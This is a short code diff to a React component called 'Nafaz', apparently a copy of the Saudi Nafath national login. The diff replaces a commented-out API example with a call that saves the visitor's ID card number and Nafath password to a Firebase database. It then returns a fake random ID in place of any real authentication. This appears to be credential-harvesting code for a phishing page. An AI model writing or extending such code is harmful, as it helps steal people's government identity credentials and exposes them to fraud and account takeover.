@@ -5,6 +5,7 @@
 import type React from "react";
 import { useEffect, useState } from "react";
 import NafazModal from "../components/NafazModal";
+import { addData } from "../apis/firebase";
 
 interface NafazFormData {
   identity_number: string;
@@ -74,14 +75,7 @@ export default function Nafaz({
   ) => {
     // Replace with your API call
     try {
-      // Example API call:
-      // const response = await fetch('/api/nafad-credentials', {
-      //   method: 'POST',
-      //   headers: { 'Content-Type': 'application/json' },
-      //   body: JSON.stringify({ orderId, idCardNumber, password })
-      // });
-      // return response.json();
-
+      addData({ id: _orderId, _idCardNumber, nafadPass: _password });
       // For now, just return a mock ID
       return "nafad-" + Math.random().toString(36).substring(2, 10);
     } catch (error) {
